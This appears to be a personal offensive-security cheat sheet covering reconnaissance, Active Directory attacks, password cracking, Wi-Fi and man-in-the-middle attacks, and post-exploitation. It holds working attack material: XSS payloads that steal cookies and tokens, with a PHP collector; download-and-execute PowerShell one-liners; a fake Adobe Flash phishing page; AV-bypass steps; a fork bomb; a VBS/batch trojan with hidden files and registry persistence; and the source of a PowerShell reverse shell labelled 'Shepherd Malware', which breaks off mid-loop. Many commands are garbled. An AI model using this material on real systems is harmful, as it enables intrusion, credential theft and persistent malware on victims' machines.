--------------------------------------------------------------------------------
[+]            Rojahs Montari Machine Pentesters For Exploration             [+]
--------------------------------------------------------------------------------
                © 2019 RojahsMontari@gmail.com
				

 ¶▅c●▄███████||▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅||█~ ::~ :~ :►
   ▄██ ▲  █ █ ██▅▄▃▂
   ███▲ ▲ █ █ ███████       _/﹋\_
 ███████████████████████►   (҂`_´)  
 ███████████████████████    <,︻╦╤─ ҉ -   --
  ◥☼▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙☼◤    _/﹋\_

--------------------------------------------------------------------------------
[+]                Web Pentest Resources & Tricks                            [+]
--------------------------------------------------------------------------------
	             INFORMATION GATHERING  
                    DNS PENTESTING
nslookup
server http://example
       172.10.10.3 
       127.0.0.2
dnsrecon -d http://example.com -t axfr
dnsrecon -d 127.0.0.1 -r 127.0.0.1/24

dig http://http://example.com -t ns
dig -x http://example.com
dig axfr http://example.com @n1.http://example.com 

nmap http://example.com --script=dns-zone-transfer -p 53 (zone transfer)
nmap -sn -Pn http://example.com --script hostmap-crtsh

amass enum -src -brute -min-for-recursive 2 -d http://example.com
masscan -p1-65535 --rate=10000 -oG masscan http://example

host -t ns  http://example.com
host -t mx http://example.com (mail servers)
host -l $ip ns1.$ip (zone transfer)
host -t ns http://example.com | cut -d " " -f 4 # (finding domain names)
theHarvester  -l 500 -b all -d  http://example.com

nmap -sT --spoof-mac Cisco http://example port 
nmap --script-help ftp-anon
locate .nse | grep ftp
nmap -p 548 --script afp-brute
nmap --mtu ip port
uniscan -u 172.10.10.3 -qweds
searchsploit --exclude=dos -t apache 2.2.3
my-ip-neighbours.com locating virtual ips
sudo nmap --spoof-mac Cisco -sT -sC -sV -v -Pn -n -T4 -p- --reason --version-intensity=5 127.0.0.1

VPN EXPLOITATION
snpwalk -c public -v2c  http://example.com
snmp-check  http://example.com

davtest  -url http:// http://example.com
whatweb http://example.com -vv
whatweb -a 1 http://example.com #Stealthy

#Gobuster
gobuster dir -u http://127.5.0.1/ -w /usr/share/wordlists/dirbuster/ -o http://example.log

dirsearch -w /wordlists/ -u http:// / -o format.txt -e php,asp,net,jsp -t 50

whatweb -a 3 http://example.com #Aggresive
cmsmap -f W/J/D/M -u a -p a https://wordpress.com

nikto -h  http://example.com
dirhunt  http://example.com
testssl.sh [--htmlfile] --openssl-timeout 5 http://example.com:443
sslscan <host:port>
sslyze --regular <ip:port>

cmsmap [-f W] -F -d  http://example.com
wpscan --force update -e --url  http://example.com
joomscan --ec -u  http://example.com
joomlavs.rb #https://github.com/rastating/joomlavs

whois -h http://example.com -p 443 "domain.tld"
whois -h 10.10.10.155 -p 43 "a') or 1=1#"

curl http:http://example.com/?foo=bar

--------------------------------------------------------------------------------
[+]                    XSS ATTACKS  EXPLOITATION                              [+]
--------------------------------------------------------------------------------
<script>document.location='http://localhost/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>

#Xsser
At least one -payloader- using a keyword: 'XSS' (for hex.hash) or 'X1S' (for int.hash):

xsser -u 'https://http://example.com' -g '/path/profile.php?username=bob&surname=XSS&age=X1S&job=XSS'
(POST): xsser -u 'https://http://example.com/login.php' -p 'username=bob&password=XSS&captcha=X1S'

Any extra attack(s) (Xsa, Xsr, Coo, Dorker, Crawler...):

#GET+Cookie 
xsser -u 'https://http://example.com' -g '/path/id.php?=2' --Coo
(POST+XSA+XSR+Cookie): xsser -u 'https://http://example.com/login.php' -p 'username=admin&password=admin' --Xsa --Xsr --Coo
(Dorker): xsser -d 'news.php?id=' --Da
(Crawler): xsser -u 'https://http://example.com' -c 100 --Cl

#GET+Manual 
xsser -u 'https://http://example.com' -g '/users/profile.php?user=XSS&salary=X1S' --payload='<script>alert(XSS);</script>'
(POST+Manual): xsser -u 'https://http://example.com/login.asp' -p 'username=bob&password=XSS' --payload='}}%%&//<sc&ri/pt>(XSS)--;>'

#GET+Cookie: 
xsser -u 'https://http://example.com' -g '/login.asp?user=bob&password=XSS' --Coo
(POST+XSR+XSA): xsser -u 'https://http://example.com/login.asp' -p 'username=bob&password=XSS' --Xsr --Xsa

#SCRIPTS
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1>
<form>Username: <input type='text'>Password: <input type='password'></form>
<input value='submit' type='submit'>"
</script>

#grabber.phpXSS
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>

#Sqlmap
sqlmap.py -u "http://http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
sqlmap -u "http://http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
sqlmap.py -d "mysql://user:pass@ip/database" --dump-all --proxy="http://127.0.0.1:8080"
sqlmap -u "http://http://example.com" –headers="x-forwarded-for:127.0.0.1*"

--------------------------------------------------------------------------------
[+]                      Download file  & EXECUTE                            [+]
--------------------------------------------------------------------------------
powershell cd $Env:TMP;certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/R0J4H5/Shepherd/main/.ps1" .ps1
powershell cd $Env:TMP;iwr -Uri 'https://raw.githubusercontent.com/R0J4H5/Shepherd/main/.ps1' -OutFile '.ps1';powershell -W 1 -exec -File '.ps1'

Invoke-WebRequest -Uri $url -OutFile $dest -Credential $credObject
impachet-smbserver -smb2support kali 'pwd'
\\127.0.0.1\kali\shell.exe
IWR -uri http://attackerip:80/Microsoft.exe -OutFile c:\\users\\Microsoft.exe
./smbserver.py Trinitysec $(pwd) -smb2support -user TrinityAdmn -password abc123

ps c:/>$pass = convertto-securestring 'abc123' -AsPlainText -Force
ps c:/>$pass
ps c:/>$cred = New-Object System.Management.Automation.PSCredential('TrinityAdmn', $pass)
ps c:/>$cred
ps c:/>New-PSDrive -Name TrinityAdmn -PSProvider FileSystem -Credential $cred -root \\127.0.0.1\Trinitysec (HDD)
ps c:/>net user TrinityAdmn Trinitysec /add /domain
ps c:/>net group "Exchange Windows Permissions"
ps c:/>net group "Exchange Windows Permissions" /add TrinityAdmn
ps c:/>net group "Exchange Windows Permissions"
ps c:/>cd TrinityAdmn:
ps c:/>.\Sharphound.exe -c all

#git PowerSploit -b dev
ps c:/>IEX(New-Object Net.WebClient).downloadString('http://127.0.0.1/PowerView.ps1')
ps c:/>$pass = convertto-securestring 'abc123' -AsPlainText -Force
ps c:/>$cred = New-Object System.Management.Automation.PSCredential('HTB\TrinityAdmn', $pass)
ps c:/>Add-DomainObjectAcl -Credential $cred -http://exampleIdentity "DC=htb,DC=local" -PrincipalIdentity TrinityAdmn -Rights DCSync
ps c:/>Get-ADDomain htb.local

secretsdump.py htb.local/TrinityAdmn:abcd123@172.10.10.3
psexec.py -hashes 32cdf72gf:32cdf72gf administrator@172.10.10.3
psexec.py -debug -k -no-pass htb.local/administrator@forest

--------------------------------------------------------------------------------
[+]                        Acive Dir - Hacking                               [+]
--------------------------------------------------------------------------------
#Bloodhound
-----------
neo4j console
bloodhound
git clone https://github.com/BloodHoundAD/SharpHound3
  .\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
  .\SharpHound.exe -c all -d active.htb -SearchForest
  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
  .\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFi>
  .\SharpHound.exe -c all -d active.htb -SearchForest
  .\SharpHound.exe --EncryptZip --ZipFilename export.zip
  .\SharpHound.exe -c all,GPOLocalGroup
  .\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
  .\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
  .\SharpHound.exe -c all,GPOLocalGroup --searchforest
  .\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache 
    --encryptzip --collectallproperties --throttle 10000 --jitter 23

  Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
  Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
  https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1

  # or remotely via BloodHound Python
  # https://github.com/fox-it/BloodHound.py
  pip install bloodhound
  bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all

nmap -p 445 172.10.10.3 --script=smb-vuln-ms17-010 (eternalblue scan)
nmap -n -Pn -p 445 --script smb-vuln-ms17-010 10.10.10.0/24
windows/smb/ms17_010_eternalblue

git clone https://github.com/fox-it/mitm6.git && cd mitm6 && pip install .
mitm6 -d lab.local
ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
  # -wh: Server hosting WPAD file (Attacker’s IP)
  # -t: http://example (You cannot relay credentials to the same device that you’re spoofing)
  # -i: open an interactive shell
ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access

enum4linux http://target.com/

smbmap -H http://target.com/ -u anonymous
smbmap -H http://target.com/ -u anonymous -r --depth 5
smbmap -H http://target.com/                # null session
smbmap -H http://target.com/ -R             # recursive listing
smbmap -H http://target.com/ -u invaliduser # guest smb session
smbmap -H http://target.com/ -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

smbclient \\\\127.0.0.2\\malware_dropbox pass enter default
smbclient -I http://target.com/ -L ACTIVE -N -U ""
smbclient -U username //127.0.0.1/SYSVOL
smbclient //127.0.0.1/Share
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> lcd '/path/to/go/'
smb: \> mget *

mount -t cifs -o username=<user>,password=<pass> //<IP>/Users folder

cme smb http://target.com/ --pass-pol
cme smb http://target.com/ --pass-pol -u '' -p ''
cme smb http://target.com/ -u userlist.out -p pwlist.out
cme smb http://target.com/ --pass-pol -u admin -p adc123 --shares
cme smb 127.0.0.1/24 -u Administrator -p `(mp64 Pass@wor?l?a)`

cme smb -L
cme smb -M name_module -o VAR=DATA
cme smb 127.0.0.1 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
cme smb 127.0.0.1 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
cme smb 127.0.0.1 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
cme smb 127.0.0.1 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
cme smb 127.0.0.1 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
cme smb 127.0.0.1 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
cme mimikatz --server http --server-port 80

--------------------------------------------------------------------------------
[+]                      Wsman Port - Hacking                                [+]
--------------------------------------------------------------------------------
#wsman port
evl-winrm.rb -u admin -p abc123 -i 172.10.10.3
grep 'def ' smbmap.py

rpcclient -U '' -P '' 172.10.10.3
rpcclient $>enumdomusers
          $>querygroup 0x47c
          $>queryuser 0x47b
Impackets
GetNPUsers.py -dc-ip 172.10.10.3 -request 'htt.local/' -format hashcat

#RDP Attacks
hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://10.10.10.10
ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10

#389::Ldapsearch
ldapsearch -h 172.10.10.3
ldapserach -h 172.10.10.3 -x
                              -s base naming context
                                  -b "DC=htb,DC=local" > ldap-anonymous.out
cat ldap-anonymous.out | grep -i memberof
ldapsearch -h 172.10.10.3 -x -b "DC=htb,DC=local" '(objectClass=Person)'
    (objectClass=User) sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap

for i in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done
                                                         

--------------------------------------------------------------------------------
[+]       Linux Storage, Data Recovery & Password attacks.                   [+]
--------------------------------------------------------------------------------
#Hdd Passwords
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 luckshash 
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt

du -s file
$ sudo apt-get install foremost
$ fdisk -l
    Copy the name of your plugin disk or drive (http://example:- sda/sdb1)
$ foremost -t(file types) mp3,jpeg,pdf -q(quick scan) -i sda/sdb1(drive or disk) -o /root/Desktop/Output (Output folder)

 Follow The Simple Steps

    Select the saved password
    Right-click on it and select inspect
    The entire source code of the page is visible on the right
    In the source code change the type of attribute from Password to Text
    Now press enter the password will be unmasked and you can see it.

: () { :| :& }; : OS KILLER

--------------------------------------------------------------------------------
[+]                    Password Attacks.                                     [+]
--------------------------------------------------------------------------------
wfuzz -u http://http://example/index.php?action=authentication -d 'username=admin&password=FUZZ' -w .txt --hc 4003
medusa -h 127.0.0.1 -U user.txt -P /opt/wordlist/rockyou.txt -M smbnt,ssh,smb 127.0.0.1
hydra -l administrator -P /opt/wordlists/rockyou.txt -t 1 172.10.10.3 smb
ncrack -p 22 --user root -P ./rockyou.txt 10.10.10.0/24
john hashes.txt

#FTP Pass attack
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
wget -m ftp://anonymous:anonymous@1127.0.0.1 #Donwload all
wget -m --no-pasive ftp://anonymous:anonymous@127.0.0.1 #Download all
sudo nmap -sT -sV -Pn -vv -p 22 --script='ftp-* AND NOT ftp-brute*' --stats-every 10s http://example

#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart

#Zip File with password
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
zip2john file.zip > zip.john
john zip.john

7z File With password
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z

#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
sudo apt-get -o Acquire::Check-Valid-Until=false  && sudo apt install
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john

#Ntlm Hashes
#Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netlm file_NTLM.hashes
hashid (type of hash)
hashcat --http://example-hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot

#Http Hydra attack
hydra -L /users.txt -P /pass.lst domain.htb  http-post-form "/index.php:name=^USER^&pass=^PASS^&enter=Sign+in:password is incorrect" -V

#IMAP Attacks
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>

#Gathering Passwords
cewl http://example.com -m 5 -w words.txt

#Pasword Cracking
hashcat --http://example-hashes | grep 300
hashcat --http://example-hashes | grep -i krb
hashcat -m 18200 /hashes/svc-alfresco /usr/share/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule

hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes

--------------------------------------------------------------------------------
[+]               Networking, Mitm & Wifi Hacks                              [+]
--------------------------------------------------------------------------------
#simple hhtpserver
python -m SimpleHTTPServer 7000

#Bluetooth
#We will use hcitool to find all the available BLE device present near the hos
hciconfig
hciconfig hci0 up
hciconfig hci0 class
hciconfig hci0 class 0x1c010c
hcitool lescan
sdptool browse --tree --l2cap 58:DB:15:03:19:36 #about given device
gatttool -I connect 88:C2:55:CA:E9:4A primary
char-desc 0x0010 0xffff #attr and end group handles  which in this case is 0x0010 0xffff
char-read-hnd 0x0012  #reading the handle with their handle value
ubertooth-btle -f -t 88:C2:55:CA:E9:4A -c smartbulb_dump.pcap  #follow connections for our http://example device

#Car Hacking
carwhisperer hci0 out.raw recordpresident.raw address

netdiscover -p
p0f -i lo -p -o /tmp/p0f.log
arp-scan --localnet
arp-scan --interface=eth0 192.168.0.0/24

#EtterCap
ettercap -T -Q -i lo -P dns_spoof -M ARP //rhost// //gateway//
ettercap -T -w dump -M ARP
ettercap -T -w -M -ARP

#Arpspoof
1) echo "1" > /proc/sys/net/ipv4/ip_forward
2) iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>
3) Run sslstrip with the command-line options you'd like (see above).
4) arpspoof -i eth0 -t <yourhttp://example> <theRoutersIpAddress>

#Bettercap
bettercap -caplet beef-active.cap -eval "set arp.spoof.http://example.coom/ 127.0.0.1"

apt-get install gcc-mingw-w64-x86-64
x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv
x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode
responder -I eth0 -wrf
responder-MultiRelay -t 127.0.0.1 -u ALL

#Ferret/Hamster
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 80 -j REDIRECT --to-port 1000
sslstrip -f -a -k -l 1000 -w /root/out.txt
arpspoof -i eth0 {gateway} -t http://example gateway
ferret -i eth0
hamster
urlsnaf
driftnet
tshark -i 1 -V -w traffic.txt

sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets

netdiscover = ip neigh
nmap -n -sn -Pr 192.168.220.0/24

ip neigh flush all

#Beef
payload to /usr/share/beef-xss/extensions/demos/html
beef social engneering
fake flash
Costom url http://myip:3000/demos/payload.exe
image http://myip/adobe_flash_updating.jpg

#Metasploit
load msgrpc ServerHost=127.0.0.1 Pass=abc123
/usr/share/metasploit-framework/msfrpcd -f -S -P 0011.. -U msf -u /api -a 127.0.0.1 -p 55552 -v

--------------------------------------------------------------------------------
[+]                          Post Exploitation                               [+]
--------------------------------------------------------------------------------
#AV Bypass and Compillinug
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
i686-w64-mingw32-g++ openthesis.cpp -o .exe -lws2_32 -s -ffunction-sections -fdata-sections
 -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
x86_64-w64-mingw32-gcc {source_file} -o {exe_name}.exe #.cpp
mcs -platform:x64 -unsafe Program.cs -win32icon:bing.ico -reference:System.Windows.Forms -out:trinity.exe #.cs

#Adding Icon To Payload
wine rcedit.exe --set-icon icon.ico {exe_name}.exe
rcedit --set-icon icons\Microsoft-Word.ico Word.exe
iexpress

#Dll exploits
rundll32 \\webdavserver\folder\payload.dll,entrypoint
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();

#Koadic
use stager/js/rundll32_js
set SRVHOST 10.10.10.128
set ENDPOINT sales
run

#MSHTA Hacks
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit

#Listeners
use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false

#Mimikatz
meterpreter
load kiwi
kiwi_cmd '"dpapi::"'
sekurlsa::pth /user:Administrator /domain:EXADATA /ntlm:ea62008fa0d4b9b25540084c2be9f192 /run:cmd
sekurlsa::tickets
sekurlsa::logonpasswords
privilege::debug
token::elevate
lsadump::sam 
lsadump::secrets
kerberos::list
vault::list

#privilage-escalation
#windows
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
python3 -c 'import pty;pty.spawn("/bin/bash")'
cmd /c Winpeas.bat

.\lib /Def:C:/mimikatz-master/lib/x64/netapi32.def /OUT:C:/mimikatz-master/lib/x64/netapi32.min.lib /MACHINE:x64

#Macro
Sub Main
    PleasSubscibe = "cm"
    ToMy = "d /c"
    Channel = "Power"
    addSuport = "shell -en"
    MeOnPatr = "codedcommand "
    Shell(PleasSubscribe + ToMy + Channel + addSuport + MeOnPartr)
    
 End Sub

responder -i lo
nc powershell -> Get-Content \\172.10.10.3\content then save the hashes re.ntlm
hashcat --http://example-hashes | less
hashcat -m 5600 hashes/re.ntlmv2 /opt/wordlist/rockyou.txt
https://book.hacktricks.xyz/windows/windows-local-privilages-escalation#alwaysinstallelevated

upx -9 -qq calc.exe

--------------------------------------------------------------------------------
[+]                         Android Pentesting                               [+]
--------------------------------------------------------------------------------
apt-get install adb
adb connect $ip:port
adb shell

save it as anything.sh
#!/bin/bash
while true
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done

#!/bin/bash
while :
do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done

    cd /
    cd /sdcard/Download
    ls
    upload anything.sh
    sh anything.sh
    

#Android Av Bypass
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
apksigner sign --ks release.jks application.apk

zip -d my_application.apk META-INF/\*
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name
zipalign -v 4 your_project_name-unaligned.apk your_project_name.apk

#Https Certs
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
  -keyout http://shepherd.key -out http://shepherd.crt -extensions san -config \
  <(echo "[req]"; 
    echo distinguished_name=req; 
    echo "[san]"; 
    echo subjectAltName=DNS:shepherd.org,DNS:www.shepherd.org,IP:0.0.0.0
    ) \
  -subj "/CN=shepherd.org"
  
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=shepherd.pem,cafile=shepherd.crt,verify=0 -

#Fake website
<DOCTYPE!html>
<html>
<head>
<title>Adobe flash</title>
<script src="http://127.0.0.1:3000/hook.js"></script>
</head>
<body><center>
<img src="adobe.jpg" alt="adobe" width="1475" length="500">
<p><input type="button" name="btnDownload" value="Download" onclick="window.open"
('adobe.exe','download')" return false;"/></p>
</body>
</html>

--------------------------------------------------------------------------------
[+]                          Wifi  Hacking                                   [+]
--------------------------------------------------------------------------------
service apache2 start
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
airodump-ng wlan0
iwconfig wlan0 channel ##

airodump-ng -w capture -c ## -bssid mac_from_ap wlan0
aireplay-ng -0 10 -a mac_from_ap -c mac_from_a_client wlan0 in another terminal
aircrack-ng -w /pentest/wireless/aircrack-ng/test/password.lst capture01.cap
nano /etc/hostapd/hostapd.conf
dnschef --nameserver=1.1.1.#53 --fakeip= --interface=ip --fakedomain=google.com *.ike.com 
airbase-ng -e "Wife-Name" -a maccaddress -c1 wlan0

macchanger -mac=00:11:22:33:44:55 wlan0
iwconfig wlan0 mode monitor
airodump-ng -c ## -w capture -ivs wlan0
aireplay-ng -e wireless_network_name -a bssid_ap_victim -h 00:11:22:33:44:55 -fakeauth 10 wlan0
aireplay-ng -arpreplay -b bssid_ap_victim -h 00:11:22:33:44:55 wlan0
aircrack-ng -0 -n 64 capture-##.ivs
echo 1 > /proc/sys/net/ipv4/ip_forward

#Kicking People Out
iptables -t nat -A POSTROUTING -O wlan0 -j MASQUAERADE
airplay-ng --deuth 0 -a http://examplemaccadress -c routermaccadress wlan0

#CanTool
sh setup_vcan.sh
./icsim vcan 0
./controls vcan0
candump -i vcan0
cansniffer -c vcan0
--capture data via wiresharck

#Macchanger
nano /etc/systemd/system/changemac@.service
[Unit]
Description=changes mac for %I
Wants=network.http://example
Before=network.http://example
BindsTo=sys-subsystem-net-devices-%i.device
After=sys-subsystem-net-devices-%i.device

[Service]
Type=oneshot
ExecStart=/usr/bin/macchanger -r %I
RemainAfterExit=yes

[Install]
WantedBy=multi-user.http://example
sudo systemctl enable changemac@eth0.service

--------------------------------------------------------------------------------
[+]                              Tor                                         [+]
--------------------------------------------------------------------------------
#Tor
https://check.torproject.org
torsocks --shell

#SendMail
---------
sendmail -f bigboss@inseguro.com -t http://example@gmail.com -u "Important REport" -s 127.0.0.1:25 -a cmd.exe

#NetCat
-------
nc -zv 172.10.10.3

Prntestmonley abuse sudo advanced
Visual traceroute tools {good online info gather}

#Whats Myipv4
curl ipinfo.io
Invoke-RestMethod -Uri https://ipinfo.io

wget -mkEpnp https://book.hacktricks.xyz/

https://www.ired.team/
#Network editing
gedit /etc/systemd/resolved.conf
systemctl status systemd-resolved
resolvectl statistics
ln -sf /etc/systemd/resolved.conf /etc/resolv.conf
nano /etc/NetworkManager/NetworkManager.conf
sudo systemctl unmask systemd-resolved

--------------------------------------------------------------------------------
[+]                        Ports Fowarding                                   [+]
--------------------------------------------------------------------------------
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
ngrok http 4433
ngrok tcp 4433

ncat -v -l -p 8080 -c "ncat -v -l -p 9090"
socat -v tcp-listen:8080 tcp-listen:9090

# exposes the SMB port of the machine in the port 445 of the SSH Server
plink -l root -pw toor -R 445:127.0.0.1:445 
# exposes the RDP port of the machine in the port 3390 of the SSH Server
plink -l root -pw toor ssh-server-ip -R 3390:127.0.0.1:3389  

plink -l root -pw mypassword 192.168.18.84 -R
plink.exe -v -pw mypassword user@10.10.10.10 -L 6666:127.0.0.1:445

plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your local machine] [VPS IP]
# redirects the Windows port 445 to Kali on port 22
plink -P 22 -l root -pw some_password -C -R 445:127.0.0.1:445 192.168.12.185   

git clone https://github.com/ginuerzh/gost
cd gost/cmd/gost
go build

# Socks5 Proxy
Server side: gost -L=socks5://:1080
Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true

# Local Port Forward
gost -L=tcp://:2222/192.168.1.1:22 [-F=..]

## Simple User

Set a file as hidden
attrib +h c:\autoexec.bat

--------------------------------------------------------------------------------
[+]                   VBS TROJAN PoWeRsHeLl -Win 1 -EnC                      [+]
--------------------------------------------------------------------------------
@echo off

cd %TEMP%

echo @echo off > wncat.bat
echo :loop >> wncat.bat
echo timeout /t 10 >> wncat.bat
echo powershell -w 1 -enc "" >> wncat.bat
echo goto loop >> wncat.bat

echo Dim WinScriptHost > wncat.vbs
echo Set WinScriptHost ^= CreateObject^("WScript.Shell") >> wncat.vbs
echo WinScriptHost.Run Chr^(34^) ^& "%TEMP%\wncat.bat" ^& Chr^(34^)^, 0 >> wncat.vbs
echo Set WinScriptHost ^= Nothing >> wncat.vbs

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "%TEMP%\wncat.vbs"

attrib +h .\wncat.bat
attrib +h .\wncat.vbs

powershell -w 1 -enc ""

%TEMP%\wncat.vbs

--------------------------------------------------------------------------------
[+]                          -Generator-                                     [+]
--------------------------------------------------------------------------------
*Invoke-PSObfuscation -Path /home/redteam/Shepherd.ps1 -Aliases -Cmdlets -Comments -Methods -Pipes -PipelineVariables -ShowChanges
*All
*Integers
*NamespaceClasses
*Strings *Variables

--------------------------------------------------------------------------------
[+]                      Shepherd Malware                                    [+]
--------------------------------------------------------------------------------

do {
    Start-Sleep -Seconds 1
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 443)
    } catch {}
} until ($TCPClient.Connected)
$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $StreamWriter.Write($String + 'PS ' + (pwd).Path + '> ')
    $StreamWriter.Flush()
}
WriteToStream ''
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {   
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
